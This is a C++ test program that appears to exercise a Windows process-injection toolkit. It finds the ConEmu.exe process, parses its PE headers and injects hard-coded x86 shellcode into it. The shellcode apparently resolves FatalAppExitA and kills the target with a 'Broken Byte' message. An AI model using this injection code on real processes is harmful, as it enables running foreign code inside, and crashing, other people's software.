#define _CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>

#include "util.h"
#include "pe.h"
#include "inject.h"

int main(int argc, char* argv[])
{
    _CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);

    // Test process info data retrieval
    PROCESS_INFO process_info;
    get_process_info("ConEmu.exe", process_info);
    
    // Test if parser for PE is working
    pe_parser_t* parser = create_pe_parser(process_info);
    parser->obtain_handle();
    parser->read_dos_header();
    parser->read_nt_header();
    delete parser;

    // Test the injector modules
    std::vector<BYTE> shellcode = { 0x31, 0xd2, 0xb2, 0x30, 0x64, 0x8b, 0x12, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 
                                    0x1c, 0x8b, 0x42, 0x08, 0x8b, 0x72, 0x20, 0x8b, 0x12, 0x80, 0x7e, 0x0c, 
                                    0x33, 0x75, 0xf2, 0x89, 0xc7, 0x03, 0x78, 0x3c, 0x8b, 0x57, 0x78, 0x01, 
                                    0xc2, 0x8b, 0x7a, 0x20, 0x01, 0xc7, 0x31, 0xed, 0x8b, 0x34, 0xaf, 0x01, 
                                    0xc6, 0x45, 0x81, 0x3e, 0x46, 0x61, 0x74, 0x61, 0x75, 0xf2, 0x81, 0x7e, 
                                    0x08, 0x45, 0x78, 0x69, 0x74, 0x75, 0xe9, 0x8b, 0x7a, 0x24, 0x01, 0xc7, 
                                    0x66, 0x8b, 0x2c, 0x6f, 0x8b, 0x7a, 0x1c, 0x01, 0xc7, 0x8b, 0x7c, 0xaf, 
                                    0xfc, 0x01, 0xc7, 0x68, 0x79, 0x74, 0x65, 0x01, 0x68, 0x6b, 0x65, 0x6e, 
                                    0x42, 0x68, 0x20, 0x42, 0x72, 0x6f, 0x89, 0xe1, 0xfe, 0x49, 0x0b, 0x31, 
                                    0xc0, 0x51, 0x50, 0xff, 0xd7 };
    injector_t injector;
    injector.inject_shellcode(process_info, shellcode);

    _CrtDumpMemoryLeaks();
    system("pause");
    return 0;
}